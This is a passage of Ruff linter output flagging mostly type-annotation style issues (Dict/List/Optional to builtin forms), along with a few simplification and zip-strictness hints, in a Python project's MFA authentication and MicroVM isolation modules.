    |                                        ^^^^
805 |         """Authenticate with biometric"""
806 |         with self._lock:
    |
help: Replace with `dict`

B905 `zip()` without an explicit `strict=` parameter
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:861:49
    |
859 |         # Simplified similarity calculation
860 |         # Production systems would use sophisticated matching algorithms
861 |         matching_bytes = sum(a == b for a, b in zip(hash1, hash2))
    |                                                 ^^^^^^^^^^^^^^^^^
862 |         return matching_bytes / len(hash1)
    |
help: Add explicit value for parameter `strict=`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:879:32
    |
877 |     """
878 |
879 |     def __init__(self, config: Optional[Dict[str, Any]] = None):
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^
880 |         self.logger = logging.getLogger(__name__)
881 |         self.config = config or {}
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:879:41
    |
877 |     """
878 |
879 |     def __init__(self, config: Optional[Dict[str, Any]] = None):
    |                                         ^^^^
880 |         self.logger = logging.getLogger(__name__)
881 |         self.config = config or {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:884:25
    |
883 |         # Initialize authentication providers
884 |         self.providers: Dict[AuthMethod, AuthenticationProvider] = {
    |                         ^^^^
885 |             AuthMethod.TOTP: TOTPProvider(),
886 |             AuthMethod.FIDO2: FIDO2Provider(),
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:894:25
    |
893 |         # Active sessions
894 |         self._sessions: Dict[str, AuthContext] = {}
    |                         ^^^^
895 |         self._session_lock = threading.Lock()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:898:30
    |
897 |         # Risk-based authentication policies
898 |         self._auth_policies: Dict[RiskLevel, List[AuthMethod]] = {
    |                              ^^^^
899 |             RiskLevel.MINIMAL: [AuthMethod.PASSWORD],
900 |             RiskLevel.LOW: [AuthMethod.PASSWORD, AuthMethod.TOTP],
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:898:46
    |
897 |         # Risk-based authentication policies
898 |         self._auth_policies: Dict[RiskLevel, List[AuthMethod]] = {
    |                                              ^^^^
899 |             RiskLevel.MINIMAL: [AuthMethod.PASSWORD],
900 |             RiskLevel.LOW: [AuthMethod.PASSWORD, AuthMethod.TOTP],
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:921:33
    |
920 |         # Session timeout configuration (seconds)
921 |         self._session_timeouts: Dict[AuthLevel, float] = {
    |                                 ^^^^
922 |             AuthLevel.BASIC: 3600,  # 1 hour
923 |             AuthLevel.STANDARD: 7200,  # 2 hours
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:930:37
    |
929 |         # Privacy Risk Engine integration callback
930 |         self._risk_engine_callback: Optional[Callable] = None
    |                                     ^^^^^^^^^^^^^^^^^^
931 |
932 |         # Audit log
    |
help: Convert to `X | None`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:972:10
    |
970 |     def authenticate(
971 |         self, context: AuthContext, method: AuthMethod, credential: Any
972 |     ) -> Tuple[bool, Optional[str]]:
    |          ^^^^^
973 |         """
974 |         Authenticate using specified method.
    |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:972:22
    |
970 |     def authenticate(
971 |         self, context: AuthContext, method: AuthMethod, credential: Any
972 |     ) -> Tuple[bool, Optional[str]]:
    |                      ^^^^^^^^^^^^^
973 |         """
974 |         Authenticate using specified method.
    |
help: Convert to `X | None`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1023:10
     |
1021 |     def enroll_method(
1022 |         self, user_id: str, method: AuthMethod, credential_data: Any
1023 |     ) -> Tuple[bool, Optional[Dict[str, Any]]]:
     |          ^^^^^
1024 |         """
1025 |         Enroll new authentication method for user.
     |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1023:22
     |
1021 |     def enroll_method(
1022 |         self, user_id: str, method: AuthMethod, credential_data: Any
1023 |     ) -> Tuple[bool, Optional[Dict[str, Any]]]:
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^
1024 |         """
1025 |         Enroll new authentication method for user.
     |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1023:31
     |
1021 |     def enroll_method(
1022 |         self, user_id: str, method: AuthMethod, credential_data: Any
1023 |     ) -> Tuple[bool, Optional[Dict[str, Any]]]:
     |                               ^^^^
1024 |         """
1025 |         Enroll new authentication method for user.
     |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1100:10
     |
1098 |     def require_escalation(
1099 |         self, context: AuthContext, target_level: AuthLevel
1100 |     ) -> Tuple[bool, List[AuthMethod]]:
     |          ^^^^^
1101 |         """
1102 |         Check if authentication escalation is required and return required methods.
     |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1100:22
     |
1098 |     def require_escalation(
1099 |         self, context: AuthContext, target_level: AuthLevel
1100 |     ) -> Tuple[bool, List[AuthMethod]]:
     |                      ^^^^
1101 |         """
1102 |         Check if authentication escalation is required and return required methods.
     |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1170:52
     |
1168 |         )
1169 |
1170 |     def validate_session(self, session_id: str) -> Tuple[bool, Optional[AuthContext]]:
     |                                                    ^^^^^
1171 |         """
1172 |         Validate session and return context if valid.
     |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1170:64
     |
1168 |         )
1169 |
1170 |     def validate_session(self, session_id: str) -> Tuple[bool, Optional[AuthContext]]:
     |                                                                ^^^^^^^^^^^^^^^^^^^^^
1171 |         """
1172 |         Validate session and return context if valid.
     |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1210:52
     |
1208 |             return False
1209 |
1210 |     def get_session_info(self, session_id: str) -> Optional[Dict[str, Any]]:
     |                                                    ^^^^^^^^^^^^^^^^^^^^^^^^
1211 |         """
1212 |         Get session information.
     |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1210:61
     |
1208 |             return False
1209 |
1210 |     def get_session_info(self, session_id: str) -> Optional[Dict[str, Any]]:
     |                                                             ^^^^
1211 |         """
1212 |         Get session information.
     |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1237:50
     |
1235 |             return None
1236 |
1237 |     def get_audit_log(self, limit: int = 100) -> List[Dict[str, Any]]:
     |                                                  ^^^^
1238 |         """
1239 |         Get recent audit log entries.
     |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1237:55
     |
1235 |             return None
1236 |
1237 |     def get_audit_log(self, limit: int = 100) -> List[Dict[str, Any]]:
     |                                                       ^^^^
1238 |         """
1239 |         Get recent audit log entries.
     |
help: Replace with `dict`

SIM103 Return the negated condition directly
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1326:9
     |
1324 |           # Check if session was created too long ago
1325 |           max_session_age = 86400  # 24 hours
1326 | /         if time.time() - context.timestamp > max_session_age:
1327 | |             return False
1328 | |
1329 | |         return True
     | |___________________^
1330 |
1331 |       def _log_audit(
     |
help: Inline condition

UP045 [*] Use `X | None` for type annotations
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1334:18
     |
1332 |         self,
1333 |         event: str,
1334 |         context: Optional[AuthContext],
     |                  ^^^^^^^^^^^^^^^^^^^^^
1335 |         metadata: Optional[Dict[str, Any]] = None,
1336 |     ):
     |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1335:19
     |
1333 |         event: str,
1334 |         context: Optional[AuthContext],
1335 |         metadata: Optional[Dict[str, Any]] = None,
     |                   ^^^^^^^^^^^^^^^^^^^^^^^^
1336 |     ):
1337 |         """Log audit event"""
     |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\mfa_auth.py:1335:28
     |
1333 |         event: str,
1334 |         context: Optional[AuthContext],
1335 |         metadata: Optional[Dict[str, Any]] = None,
     |                            ^^^^
1336 |     ):
1337 |         """Log audit event"""
     |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:18:1
   |
16 | from dataclasses import dataclass, field
17 | from enum import Enum
18 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:18:1
   |
16 | from dataclasses import dataclass, field
17 | from enum import Enum
18 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:67:17
   |
65 |     """Network configuration for a MicroVM"""
66 |
67 |     tap_device: Optional[str] = None
   |                 ^^^^^^^^^^^^^
68 |     ip_address: Optional[str] = None
69 |     mac_address: Optional[str] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:68:17
   |
67 |     tap_device: Optional[str] = None
68 |     ip_address: Optional[str] = None
   |                 ^^^^^^^^^^^^^
69 |     mac_address: Optional[str] = None
70 |     gateway: Optional[str] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:69:18
   |
67 |     tap_device: Optional[str] = None
68 |     ip_address: Optional[str] = None
69 |     mac_address: Optional[str] = None
   |                  ^^^^^^^^^^^^^
70 |     gateway: Optional[str] = None
71 |     dns_servers: List[str] = field(default_factory=list)
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:70:14
   |
68 |     ip_address: Optional[str] = None
69 |     mac_address: Optional[str] = None
70 |     gateway: Optional[str] = None
   |              ^^^^^^^^^^^^^
71 |     dns_servers: List[str] = field(default_factory=list)
72 |     isolated_network: bool = True
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:71:18
   |
69 |     mac_address: Optional[str] = None
70 |     gateway: Optional[str] = None
71 |     dns_servers: List[str] = field(default_factory=list)
   |                  ^^^^
72 |     isolated_network: bool = True
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:95:49
   |
93 |     """
94 |
95 |     def __init__(self, vm_id: str, socket_path: Optional[str] = None):
   |                                                 ^^^^^^^^^^^^^
96 |         self.logger = logging.getLogger(__name__)
97 |         self.vm_id = vm_id
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:99:23
    |
 97 |         self.vm_id = vm_id
 98 |         self.socket_path = socket_path or f"/tmp/thirstys_vm_{vm_id}.sock"
 99 |         self._socket: Optional[socket.socket] = None
    |                       ^^^^^^^^^^^^^^^^^^^^^^^
100 |         self._connected = False
101 |         self._lock = threading.Lock()
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:121:37
    |
119 |             return False
120 |
121 |     def send_message(self, message: Dict[str, Any]) -> bool:
    |                                     ^^^^
122 |         """Send message to MicroVM"""
123 |         with self._lock:
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:136:56
    |
134 |                 return False
135 |
136 |     def receive_message(self, timeout: float = 1.0) -> Optional[Dict[str, Any]]:
    |                                                        ^^^^^^^^^^^^^^^^^^^^^^^^
137 |         """Receive message from MicroVM"""
138 |         with self._lock:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:136:65
    |
134 |                 return False
135 |
136 |     def receive_message(self, timeout: float = 1.0) -> Optional[Dict[str, Any]]:
    |                                                                 ^^^^
137 |         """Receive message from MicroVM"""
138 |         with self._lock:
    |
help: Replace with `dict`

UP041 [*] Replace aliased errors with `TimeoutError`
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:162:20
    |
160 |                 return json.loads(data.decode("utf-8"))
161 |
162 |             except socket.timeout:
    |                    ^^^^^^^^^^^^^^
163 |                 return None
164 |             except Exception as e:
    |
help: Replace `socket.timeout` with builtin `TimeoutError`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:200:25
    |
198 |         isolation_type: IsolationType,
199 |         resource_limits: VMResourceLimits,
200 |         network_config: Optional[VMNetworkConfig] = None,
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^
201 |         kernel_path: Optional[str] = None,
202 |         rootfs_path: Optional[str] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:201:22
    |
199 |         resource_limits: VMResourceLimits,
200 |         network_config: Optional[VMNetworkConfig] = None,
201 |         kernel_path: Optional[str] = None,
    |                      ^^^^^^^^^^^^^
202 |         rootfs_path: Optional[str] = None,
203 |     ):
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:202:22
    |
200 |         network_config: Optional[VMNetworkConfig] = None,
201 |         kernel_path: Optional[str] = None,
202 |         rootfs_path: Optional[str] = None,
    |                      ^^^^^^^^^^^^^
203 |     ):
204 |         self.logger = logging.getLogger(__name__)
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:219:24
    |
217 |         # Runtime state
218 |         self._state = VMState.CREATED
219 |         self._process: Optional[subprocess.Popen] = None
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^
220 |         self._pid: Optional[int] = None
221 |         self._start_time: Optional[float] = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:220:20
    |
218 |         self._state = VMState.CREATED
219 |         self._process: Optional[subprocess.Popen] = None
220 |         self._pid: Optional[int] = None
    |                    ^^^^^^^^^^^^^
221 |         self._start_time: Optional[float] = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:221:27
    |
219 |         self._process: Optional[subprocess.Popen] = None
220 |         self._pid: Optional[int] = None
221 |         self._start_time: Optional[float] = None
    |                           ^^^^^^^^^^^^^^^
222 |
223 |         # Communication
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:228:31
    |
226 |         # Monitoring
227 |         self._health_metrics = VMHealthMetrics()
228 |         self._monitor_thread: Optional[threading.Thread] = None
    |                               ^^^^^^^^^^^^^^^^^^^^^^^^^^
229 |         self._monitoring_active = False
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:235:28
    |
234 |         # Firecracker/QEMU specific
235 |         self._config_file: Optional[str] = None
    |                            ^^^^^^^^^^^^^
236 |         self._socket_path = f"/tmp/thirstys_vm_{vm_id}.socket"
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:330:45
    |
328 |             return False
329 |
330 |     def _create_firecracker_config(self) -> Dict[str, Any]:
    |                                             ^^^^
331 |         """Create Firecracker configuration"""
332 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:365:38
    |
363 |         }
364 |
365 |     def _create_qemu_config(self) -> Dict[str, Any]:
    |                                      ^^^^
366 |         """Create QEMU configuration"""
367 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:440:45
    |
438 |             return False
439 |
440 |     def _build_firecracker_command(self) -> List[str]:
    |                                             ^^^^
441 |         """Build Firecracker command line"""
442 |         return [
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:450:38
    |
448 |         ]
449 |
450 |     def _build_qemu_command(self) -> List[str]:
    |                                      ^^^^
451 |         """Build QEMU command line"""
452 |         cmd = ["qemu-system-x86_64"]
    |
help: Replace with `list`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:487:13
    |
486 |               # Try to connect via communication channel
487 | /             if self._channel.connect(timeout=1.0):
488 | |                 # Send ping message
489 | |                 if self._channel.send_message({"type": "ping"}):
    | |________________________________________________________________^
490 |                       response = self._channel.receive_message(timeout=1.0)
491 |                       if response and response.get("type") == "pong":
    |
help: Combine `if` statements using `and`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:655:37
    |
654 |     def send_command(
655 |         self, command: str, params: Optional[Dict[str, Any]] = None
    |                                     ^^^^^^^^^^^^^^^^^^^^^^^^
656 |     ) -> Optional[Dict[str, Any]]:
657 |         """Send command to MicroVM"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:655:46
    |
654 |     def send_command(
655 |         self, command: str, params: Optional[Dict[str, Any]] = None
    |                                              ^^^^
656 |     ) -> Optional[Dict[str, Any]]:
657 |         """Send command to MicroVM"""
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:656:10
    |
654 |     def send_command(
655 |         self, command: str, params: Optional[Dict[str, Any]] = None
656 |     ) -> Optional[Dict[str, Any]]:
    |          ^^^^^^^^^^^^^^^^^^^^^^^^
657 |         """Send command to MicroVM"""
658 |         message = {"type": "command", "command": command, "params": params or {}}
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:656:19
    |
654 |     def send_command(
655 |         self, command: str, params: Optional[Dict[str, Any]] = None
656 |     ) -> Optional[Dict[str, Any]]:
    |                   ^^^^
657 |         """Send command to MicroVM"""
658 |         message = {"type": "command", "command": command, "params": params or {}}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:665:27
    |
663 |         return None
664 |
665 |     def get_info(self) -> Dict[str, Any]:
    |                           ^^^^
666 |         """Get VM information"""
667 |         return {
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:699:32
    |
697 |     """
698 |
699 |     def __init__(self, config: Optional[Dict[str, Any]] = None):
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^
700 |         self.logger = logging.getLogger(__name__)
701 |         self.config = config or {}
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:699:41
    |
697 |     """
698 |
699 |     def __init__(self, config: Optional[Dict[str, Any]] = None):
    |                                         ^^^^
700 |         self.logger = logging.getLogger(__name__)
701 |         self.config = config or {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:704:20
    |
703 |         # VM instances
704 |         self._vms: Dict[str, MicroVMInstance] = {}
    |                    ^^^^
705 |
706 |         # Resource tracking
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:726:31
    |
725 |         # Background tasks
726 |         self._cleanup_thread: Optional[threading.Thread] = None
    |                               ^^^^^^^^^^^^^^^^^^^^^^^^^^
727 |         self._cleanup_active = False
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:762:26
    |
760 |         self,
761 |         isolation_type: IsolationType,
762 |         resource_limits: Optional[VMResourceLimits] = None,
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
763 |         backend: Optional[VMBackend] = None,
764 |         network_config: Optional[VMNetworkConfig] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:763:18
    |
761 |         isolation_type: IsolationType,
762 |         resource_limits: Optional[VMResourceLimits] = None,
763 |         backend: Optional[VMBackend] = None,
    |                  ^^^^^^^^^^^^^^^^^^^
764 |         network_config: Optional[VMNetworkConfig] = None,
765 |         vm_id: Optional[str] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:764:25
    |
762 |         resource_limits: Optional[VMResourceLimits] = None,
763 |         backend: Optional[VMBackend] = None,
764 |         network_config: Optional[VMNetworkConfig] = None,
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^
765 |         vm_id: Optional[str] = None,
766 |     ) -> Optional[str]:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:765:16
    |
763 |         backend: Optional[VMBackend] = None,
764 |         network_config: Optional[VMNetworkConfig] = None,
765 |         vm_id: Optional[str] = None,
    |                ^^^^^^^^^^^^^
766 |     ) -> Optional[str]:
767 |         """
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:766:10
    |
764 |         network_config: Optional[VMNetworkConfig] = None,
765 |         vm_id: Optional[str] = None,
766 |     ) -> Optional[str]:
    |          ^^^^^^^^^^^^^
767 |         """
768 |         Create a new MicroVM instance.
    |
help: Convert to `X | None`

SIM103 Return the negated condition directly
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:838:9
    |
836 |               return False
837 |
838 | /         if self._total_memory_allocated + limits.memory_mb > self._max_memory_mb:
839 | |             return False
840 | |
841 | |         return True
    | |___________________^
842 |
843 |       def start_vm(self, vm_id: str) -> bool:
    |
help: Inline condition

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:907:37
    |
905 |             self.destroy_vm(vm_id)
906 |
907 |     def get_vm(self, vm_id: str) -> Optional[MicroVMInstance]:
    |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^
908 |         """Get MicroVM instance by ID"""
909 |         return self._vms.get(vm_id)
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:913:25
    |
911 |     def list_vms(
912 |         self,
913 |         isolation_type: Optional[IsolationType] = None,
    |                         ^^^^^^^^^^^^^^^^^^^^^^^
914 |         state: Optional[VMState] = None,
915 |     ) -> List[str]:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:914:16
    |
912 |         self,
913 |         isolation_type: Optional[IsolationType] = None,
914 |         state: Optional[VMState] = None,
    |                ^^^^^^^^^^^^^^^^^
915 |     ) -> List[str]:
916 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:915:10
    |
913 |         isolation_type: Optional[IsolationType] = None,
914 |         state: Optional[VMState] = None,
915 |     ) -> List[str]:
    |          ^^^^
916 |         """
917 |         List VM IDs matching criteria.
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:939:42
    |
937 |         return vms
938 |
939 |     def get_vm_info(self, vm_id: str) -> Optional[Dict[str, Any]]:
    |                                          ^^^^^^^^^^^^^^^^^^^^^^^^
940 |         """Get VM information"""
941 |         vm = self._vms.get(vm_id)
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:939:51
    |
937 |         return vms
938 |
939 |     def get_vm_info(self, vm_id: str) -> Optional[Dict[str, Any]]:
    |                                                   ^^^^
940 |         """Get VM information"""
941 |         vm = self._vms.get(vm_id)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:947:35
    |
945 |         return vm.get_info()
946 |
947 |     def get_all_vms_info(self) -> Dict[str, Dict[str, Any]]:
    |                                   ^^^^
948 |         """Get information for all VMs"""
949 |         return {vm_id: vm.get_info() for vm_id, vm in self._vms.items()}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:947:45
    |
945 |         return vm.get_info()
946 |
947 |     def get_all_vms_info(self) -> Dict[str, Dict[str, Any]]:
    |                                             ^^^^
948 |         """Get information for all VMs"""
949 |         return {vm_id: vm.get_info() for vm_id, vm in self._vms.items()}
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:952:49
    |
951 |     def send_command_to_vm(
952 |         self, vm_id: str, command: str, params: Optional[Dict[str, Any]] = None
    |                                                 ^^^^^^^^^^^^^^^^^^^^^^^^
953 |     ) -> Optional[Dict[str, Any]]:
954 |         """Send command to specific VM"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:952:58
    |
951 |     def send_command_to_vm(
952 |         self, vm_id: str, command: str, params: Optional[Dict[str, Any]] = None
    |                                                          ^^^^
953 |     ) -> Optional[Dict[str, Any]]:
954 |         """Send command to specific VM"""
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:953:10
    |
951 |     def send_command_to_vm(
952 |         self, vm_id: str, command: str, params: Optional[Dict[str, Any]] = None
953 |     ) -> Optional[Dict[str, Any]]:
    |          ^^^^^^^^^^^^^^^^^^^^^^^^
954 |         """Send command to specific VM"""
955 |         vm = self._vms.get(vm_id)
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:953:19
    |
951 |     def send_command_to_vm(
952 |         self, vm_id: str, command: str, params: Optional[Dict[str, Any]] = None
953 |     ) -> Optional[Dict[str, Any]]:
    |                   ^^^^
954 |         """Send command to specific VM"""
955 |         vm = self._vms.get(vm_id)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:961:37
    |
959 |         return vm.send_command(command, params)
960 |
961 |     def get_resource_usage(self) -> Dict[str, Any]:
